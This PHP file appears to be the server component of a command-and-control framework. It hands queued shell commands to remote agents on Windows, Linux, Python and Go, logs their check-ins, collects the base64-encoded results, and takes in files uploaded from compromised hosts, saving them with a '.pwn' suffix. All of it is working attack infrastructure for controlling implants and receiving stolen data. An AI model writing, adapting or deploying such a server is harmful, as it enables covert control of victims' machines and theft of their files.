<?php


$mode = $_GET['MODE'];
$smode = strval($mode);

if ($smode == "cmds"){

echo file_get_contents("/tmp/C2CON-cmds.txt");

$id = intval($_GET['id']);
$sid = strval($id);
$os = strval($_GET['o']);


if (!empty($id)) {

shell_exec("cat /tmp/C2CON-ping.txt | grep -v ".$sid." > /tmp/C2CON-temping");
shell_exec("cat /tmp/C2CON-temping > /tmp/C2CON-ping.txt");

$time = date("Y-m-d H:i:s"); 
$file = '/tmp/C2CON-ping.txt';


if ($os == "W"){
$current = file_get_contents($file);
$current .= "Last Ping - Agent ".$id." (Windows) => ".$time.PHP_EOL;
file_put_contents($file, $current);
}

if ($os == "L"){
$current = file_get_contents($file);
$current .= "Last Ping - Agent ".$id." (Linux) => ".$time.PHP_EOL;
file_put_contents($file, $current);
}

if ($os == "P"){
$current = file_get_contents($file);
$current .= "Last Ping - Agent ".$id." (Python) => ".$time.PHP_EOL;
file_put_contents($file, $current);
}

if ($os == "G"){
$current = file_get_contents($file);
$current .= "Last Ping - Agent ".$id." (Go) => ".$time.PHP_EOL;
file_put_contents($file, $current);
}
}
}

if ($smode == "res"){


$id = intval($_GET['id']);
$resp=$_GET[ 'RESPONSE' ];
$sid = strval($id);

if (!empty($resp)) {

$res = base64_decode($resp); 
$file = '/tmp/C2CON-res.txt';
$current = file_get_contents($file);
$current .= "Agent ".$id." => ".$res.PHP_EOL;
file_put_contents($file, $current);



shell_exec("cat /tmp/C2CON-cmds.txt | grep -v ".$sid." > /tmp/C2CON-temp");
shell_exec("cat /tmp/C2CON-temp > /tmp/C2CON-cmds.txt");
}


}


if ($smode == "up"){
$id = intval($_GET['id']);
$sid = strval($id);

$target_dir = "uploads/";
$target_file = $target_dir . basename($_FILES["data"]["name"]).".pwn";
$uploadOk = 1;
$imageFileType = strtolower(pathinfo($target_file,PATHINFO_EXTENSION));


// Check file size
if ($_FILES["data"]["size"] > 500000) {
  echo "Sorry, your file is too large.";
  $uploadOk = 0;
}


if ($uploadOk == 0) {
 echo "Not Ok";

} else {
  if (move_uploaded_file($_FILES["data"]["tmp_name"] , $target_file)) {
  $file = '/tmp/C2CON-res.txt';
  $current = file_get_contents($file);
  $current .= "Agent ".$id." => File ".basename($_FILES["data"]["name"])." Saved to $target_file".PHP_EOL;
  file_put_contents($file, $current);  
  } else {
  }
}
}
?>
